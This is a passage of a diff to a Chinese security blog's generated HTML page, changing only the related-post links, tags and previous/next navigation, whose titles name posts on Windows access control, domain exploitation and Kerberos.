                         <a href="/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="related-link">域用户与域成员机器关系及利用</a>
                     </li>
                 
+                    <li class="related-item">
+                        <a href="/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%BA%8C/" class="related-link">Windows 访问控制模型（二）</a>
+                    </li>
+                
             </ul>
         </div>
     
@@ -503,7 +977,7 @@
         
     <footer class="minimal-footer">
         
-            <div class="post-tag"><a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a></div>
+            <div class="post-tag"><a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/" rel="tag" class="post-tag-link">#域相关</a> <a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a></div>
         
         
         
@@ -527,12 +1001,12 @@
         <ul class="post-nav">
             
                 <li class="post-nav-prev">
-                    <a href="/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%80/" rel="prev">&lt; Kerberos 认证过程详细分析（一）</a>
+                    <a href="/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%BA%8C/" rel="prev">&lt; Windows 访问控制模型（二）</a>
                 </li>
             
             
                 <li class="post-nav-next">
-                    <a href="/2020/12/Windows-Https%E6%B5%81%E9%87%8F%E6%8A%93%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86/" rel="next">Windows Https流量抓取与解密 &gt;</a>
+                    <a href="/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%BA%8C/" rel="next">Kerberos 认证过程详细分析（二） &gt;</a>
                 </li>
             
         </ul>
